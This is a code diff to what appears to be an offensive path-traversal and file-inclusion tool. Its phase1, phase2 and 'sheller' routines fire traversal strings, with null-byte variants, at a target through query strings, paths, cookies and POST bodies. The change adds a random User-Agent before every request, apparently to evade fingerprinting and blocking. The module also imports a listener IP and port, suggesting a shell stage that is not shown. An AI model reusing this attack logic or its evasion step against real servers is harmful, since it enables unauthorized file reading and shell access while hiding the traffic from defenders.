@@ -22,7 +22,7 @@ import multiprocessing
 
 import core.variables as vars
 
-from core.methods.session import session
+from core.methods.session import session, random_ua
 import requests, sys, subprocess
 from core.colors import color
 from core.variables import payloadlist, nullchars, LISTENIP, LISTENPORT
@@ -150,6 +150,7 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
             if attack == 1:
                 prep, p = query(traverse, "", file, "", keyword, url, url2, s)
                 try:
+                    random_ua(s)
                     r = s.send(prep, timeout=timeout)
                 except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                     print("Timeout reached for " + url)
@@ -157,6 +158,7 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
             elif attack == 2:
                 prep, p = inpath(traverse, "", file, "", url, url2, s)
                 try:
+                    random_ua(s)
                     r = s.send(prep, timeout=timeout)
                 except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                     print("Timeout reached for " + url)
@@ -165,6 +167,7 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
                 s.cookies.set(selected, traverse + file)
                 p = traverse + file
                 try:
+                    random_ua(s)
                     r = s.get(url, timeout=timeout)
                 except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                     print("Timeout reached for " + url)
@@ -179,6 +182,7 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
                     data[pair[0].strip()] = pair[1].strip()
                 assert data != {}
                 try:
+                    random_ua(s)
                     r = s.post(url, data=data, timeout=timeout)
                 except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                     print("Timeout reached for " + url)
@@ -190,6 +194,7 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
                 if attack == 1:
                     prep, p = query(traverse, "", file, nb, keyword, url, url2, s)
                     try:
+                        random_ua(s)
                         r = s.send(prep, timeout=timeout)
                     except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                         print("Timeout reached for " + url)
@@ -197,6 +202,7 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
                 elif attack == 2:
                     prep, p = inpath(traverse, "", file, nb, url, url2, s)
                     try:
+                        random_ua(s)
                         r = s.send(prep, timeout=timeout)
                     except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                         print("Timeout reached for " + url)
@@ -205,6 +211,7 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
                     s.cookies.set(selected, traverse + file + nb)
                     p = traverse + file + nb
                     try:
+                        random_ua(s)
                         r = s.get(url, timeout=timeout)
                     except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                         print("Timeout reached for " + url)
@@ -219,6 +226,7 @@ def phase1(attack, url, url2, keyword, cookie, selected, verbose, depth, paylist
                         data[pair[0].strip()] = pair[1].strip()
                     assert data != {}
                     try:
+                        random_ua(s)
                         r = s.post(url, data=data, timeout=timeout)
                     except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                         print("Timeout reached for " + url)
@@ -353,6 +361,7 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
                             if attack == 1:
                                 prep, p = query(traverse, dir, file, "", keyword, url, url2, s)
                                 try:
+                                    random_ua(s)
                                     r = s.send(prep, timeout=timeout)
                                 except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                                     print("Timeout reached for " + url)
@@ -360,6 +369,7 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
                             elif attack == 2:
                                 prep, p = inpath(traverse, dir, file, "", url, url2, s)
                                 try:
+                                    random_ua(s)
                                     r = s.send(prep, timeout=timeout)
                                 except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                                     print("Timeout reached for " + url)
@@ -368,6 +378,7 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
                                 p = traverse + dir + file
                                 s.cookies.set(selected, traverse + dir + file)
                                 try:
+                                    random_ua(s)
                                     r = s.get(url, timeout=timeout)
                                 except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                                     print("Timeout reached for " + url)
@@ -382,6 +393,7 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
                                     data[pair[0].strip()] = pair[1].strip()
                                 assert data != {}
                                 try:
+                                    random_ua(s)
                                     r = s.post(url, data=data, timeout=timeout)
                                 except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                                     print("Timeout reached for " + url)
@@ -393,6 +405,7 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
                                 if attack == 1:
                                     prep, p = query(traverse, dir, file, nb, keyword, url, url2, s)
                                     try:
+                                        random_ua(s)
                                         r = s.send(prep, timeout=timeout)
                                     except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                                         print("Timeout reached for " + url)
@@ -400,6 +413,7 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
                                 elif attack == 2:
                                     prep, p = inpath(traverse, dir, file, nb, url, url2, s)
                                     try:
+                                        random_ua(s)
                                         r = s.send(prep, timeout=timeout)
                                     except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                                         print("Timeout reached for " + url)
@@ -408,6 +422,7 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
                                     p = traverse + dir + file + nb
                                     s.cookies.set(selected, traverse + dir + file + nb)
                                     try:
+                                        random_ua(s)
                                         r = s.get(url, timeout=timeout)
                                     except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                                         print("Timeout reached for " + url)
@@ -421,6 +436,7 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
                                         data[pair[0].strip()] = pair[1].strip()
                                     assert data != {}
                                     try:
+                                        random_ua(s)
                                         r = s.post(url, data=data, timeout=timeout)
                                     except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                                         print("Timeout reached for " + url)
@@ -543,6 +559,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                 if attack == 1:
                     prep, p = query(traverse, "", file, "", keyword, url, url2, s)
                     try:
+                        random_ua(s)
                         r = s.send(prep, timeout=timeout)
                     except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                         print("Timeout reached for " + url)
@@ -550,6 +567,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                 elif attack == 2:
                     prep, p = inpath(traverse, "", file, "", url, url2, s)
                     try:
+                        random_ua(s)
                         r = s.send(prep, timeout=timeout)
                     except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                         print("Timeout reached for " + url)
@@ -558,6 +576,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                     s.cookies.set(selected, traverse + file)
                     p = traverse + file
                     try:
+                        random_ua(s)
                         r = s.get(url, timeout=timeout)
                     except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                         print("Timeout reached for " + url)
@@ -571,6 +590,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                         data[pair[0].strip()] = pair[1].strip()
                     assert data != {}
                     try:
+                        random_ua(s)
                         r = s.post(url, data=data, timeout=timeout)
                     except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                         print("Timeout reached for " + url)
@@ -582,6 +602,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                     if attack == 1:
                         prep, p = query(traverse, "", file, "", keyword, url, url2, s)
                         try:
+                            random_ua(s)
                             r = s.send(prep, timeout=timeout)
                         except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                             print("Timeout reached for " + url)
@@ -589,6 +610,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                     elif attack == 2:
                         prep, p = inpath(traverse, "", file, "", url, url2, s)
                         try:
+                            random_ua(s)
                             r = s.send(prep, timeout=timeout)
                         except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                             print("Timeout reached for " + url)
@@ -597,6 +619,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                         s.cookies.set(selected, traverse + file)
                         p = traverse + file
                         try:
+                            random_ua(s)
                             r = s.get(url, timeout=timeout)
                         except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                             print("Timeout reached for " + url)
@@ -610,6 +633,7 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
                             data[pair[0].strip()] = pair[1].strip()
                         assert data != {}
                         try:
+                            random_ua(s)
                             r = s.post(url, data=data, timeout=timeout)
                         except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                             print("Timeout reached for " + url)
